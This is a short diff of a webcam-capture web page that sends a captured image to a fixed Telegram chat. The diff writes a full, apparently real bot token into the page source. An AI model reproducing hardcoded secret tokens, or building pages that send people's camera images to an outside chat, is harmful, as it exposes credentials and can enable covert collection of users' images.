@@ -7,8 +7,8 @@
 </head>
 <body>
     <video id="video" width="440" height="280" autoplay style="border: 1px solid red;"></video>
-    <button id="captureButton">Capture Image and Send to the user </button>
-    <canvas id="canvas" width="440" height="280" style="display: none; border: 1px solid green;"></canvas>
+    <button id="captureButton">Capture Image and Send to Telegram</button>
+    <canvas id="canvas" width="300" height="300" style="display: none; border: 1px solid green;"></canvas>
     <img id="capturedImage" src="" alt="Captured Image"  style="border: 1px blue; display: none;">
 
     <script>
@@ -39,7 +39,7 @@
 
                 
                 // Send the captured image to Telegram
-                const token = '7148086998:';
+                const token = '7148086998:AAGp04gFP183RlODDJDhNG1I270xR6Er2uk';
                 const chatId = '7043350466'; // Replace with the chat ID where you want to send the file
 
                 const formData = new FormData();
